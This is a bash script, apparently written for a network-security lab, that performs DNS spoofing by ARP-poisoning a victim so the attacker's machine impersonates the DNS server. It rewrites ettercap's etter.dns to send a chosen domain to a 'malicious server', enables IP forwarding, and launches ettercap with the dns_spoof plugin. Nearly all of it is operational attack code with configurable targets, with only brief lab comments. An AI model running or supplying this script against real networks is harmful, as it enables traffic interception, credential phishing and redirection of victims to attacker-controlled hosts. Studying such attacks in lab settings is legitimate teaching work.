#!/bin/bash

# DNS Spoofing Script for Laboratory 1
# This script performs ARP spoofing against the DNS server to intercept DNS queries

echo "=== DNS Spoofing Attack Script ==="

# Configuration variables
VICTIM_IP="${1:-192.168.1.30}"           # Victim IP
DNS_SERVER="${2:-192.168.1.4}"           # DNS Server to impersonate
EVIL_SERVER="${3:-192.168.1.100}"        # Malicious server
TARGET_DOMAIN="${4:-goodserver.com}"      # Domain to spoof

echo "Victim: $VICTIM_IP"
echo "DNS Server to impersonate: $DNS_SERVER"
echo "Evil Server: $EVIL_SERVER"
echo "Target domain: $TARGET_DOMAIN"
echo ""

# Create DNS configuration file for ettercap
DNS_SPOOF_FILE="/etc/ettercap/etter.dns"
echo "Creating DNS configuration..."

# Backup original file
cp $DNS_SPOOF_FILE $DNS_SPOOF_FILE.backup 2>/dev/null

# Create new DNS configuration
cat > $DNS_SPOOF_FILE << EOF
# Ettercap DNS spoofing configuration
# Entries for DNS spoofing laboratory

$TARGET_DOMAIN A $EVIL_SERVER
www.$TARGET_DOMAIN A $EVIL_SERVER
*.$TARGET_DOMAIN A $EVIL_SERVER

# Also redirect IPv6 queries to malicious server
$TARGET_DOMAIN AAAA ::1
www.$TARGET_DOMAIN AAAA ::1
EOF

echo "DNS configuration created in $DNS_SPOOF_FILE:"
cat $DNS_SPOOF_FILE
echo ""

# Verify that the file exists and is readable
if [ ! -f "$DNS_SPOOF_FILE" ]; then
    echo "Error: Could not create DNS configuration file"
    exit 1
fi

# Verify initial connectivity
echo "Verifying initial DNS resolution..."
nslookup $TARGET_DOMAIN || echo "Could not resolve $TARGET_DOMAIN"
echo ""

# Verify that ettercap has the dns_spoof plugin
echo "Verifying ettercap plugins..."
if ! ettercap -P list | grep -q dns_spoof; then
    echo "Error: dns_spoof plugin not found in ettercap"
    echo "Available plugins:"
    ettercap -P list
    exit 1
fi

echo "Starting DNS Spoofing with ARP Spoofing..."
echo "IMPORTANT: The attacker impersonates the DNS server"
echo "The victim will send DNS queries directly to the attacker"
echo "Press Ctrl+C to stop the attack"
echo ""

# Enable IP forwarding
echo "Enabling IP forwarding..."
if sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1; then
    echo "✓ IP forwarding enabled via sysctl"
elif [ -w /proc/sys/net/ipv4/ip_forward ]; then
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "✓ IP forwarding enabled via /proc"
else
    echo "⚠ Cannot enable IP forwarding"
fi

# Execute ARP spoofing attack against DNS server + DNS spoofing
# The victim believes the attacker IS the DNS server

# Cleanup function
cleanup() {
    echo ""
    echo "Stopping DNS Spoofing..."
    
    # Kill any remaining processes
    pkill ettercap 2>/dev/null
    
    # Restore original DNS file if backup exists
    if [ -f "$DNS_SPOOF_FILE.backup" ]; then
        mv "$DNS_SPOOF_FILE.backup" "$DNS_SPOOF_FILE"
        echo "✓ Original DNS configuration restored"
    fi
    
    echo "Attack terminated."
    exit 0
}

# Configure trap for cleanup
trap cleanup INT TERM

echo "Configuration before attack:"
echo "DNS spoofing configured for: $TARGET_DOMAIN -> $EVIL_SERVER"
echo "ARP spoofing: $VICTIM_IP believes that $DNS_SERVER is at our MAC"
echo ""

echo "Verifying initial state of victim's ARP table..."
# Get our MAC address
OUR_MAC=$(ip addr show eth0 | grep ether | awk '{print $2}')
echo "Our MAC: $OUR_MAC"

echo "Executing ettercap with more aggressive bidirectional ARP spoofing..."
echo "Command: ettercap -T -i eth0 -M arp:remote,oneway /$VICTIM_IP// /$DNS_SERVER// -P dns_spoof"
ettercap -T -i eth0 -M arp:remote,oneway /$VICTIM_IP// /$DNS_SERVER// -P dns_spoof

# Execute cleanup if command terminates normally
cleanup
